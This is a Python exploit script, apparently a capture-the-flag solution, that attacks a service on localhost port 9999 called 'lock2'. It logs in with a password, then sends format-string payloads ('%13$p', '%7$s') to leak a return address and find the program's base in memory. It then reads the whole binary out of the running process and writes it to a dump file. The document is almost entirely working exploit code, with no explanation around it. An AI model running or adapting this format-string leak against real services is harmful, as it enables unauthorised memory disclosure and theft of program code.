#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from zio import *
from time import sleep

def getBase(retAddr):
    textAddr = retAddr >> 12 << 12
    log("textAddr -> {:#x}".format(textAddr))
    
    textBase = textAddr
    while True:
        io.read_until("cmd:")
        io.writeline("..%7$s..{}\0".format(l64(textAddr)))
        io.read_until("cmd:..")
        if io.read(4) == "\x7fELF":
            textBase = textAddr
            break
        textAddr -= 0x1000
    
    sleep(0.5)
    log("textBase -> {:#x}".format(textBase))
    return textBase
    

def leak(addr):
    if "\n" in l64(addr):
        return '\0'

    io.read_until("cmd:")
    io.writeline("..%7$s..{}\0".format(l64(addr)))
    io.read_until("cmd:..")
    data = io.read_until("..")[: -2]
    return data

def dumpBin(textBase):
    f = open("lock2.dump", "a")
    addr = textBase
    while True:
        try:
            content = leak(addr)
            sleep(0.01)
            if len(content):
                f.write(content)
                f.flush()
                addr += len(content)
            else:
                f.write('\0')
                addr += 1

        except EOFError:
            f.close()
            io.close()
            success("dump finished!")
            break

io = zio(("localhost", 9999), print_write = COLORED(RAW, "yellow"), print_read = COLORED(RAW, "red"))

io.read_until(":")
io.writeline("123456")

io.read_until("cmd:")
io.writeline("..%13$p..")
io.read_until("..")
retAddr = int(io.read_until("..")[: -2], 16)
log("addr -> {:#x}".format(retAddr))

textBase = getBase(retAddr)
dumpBin(textBase)

log("dump finished!")
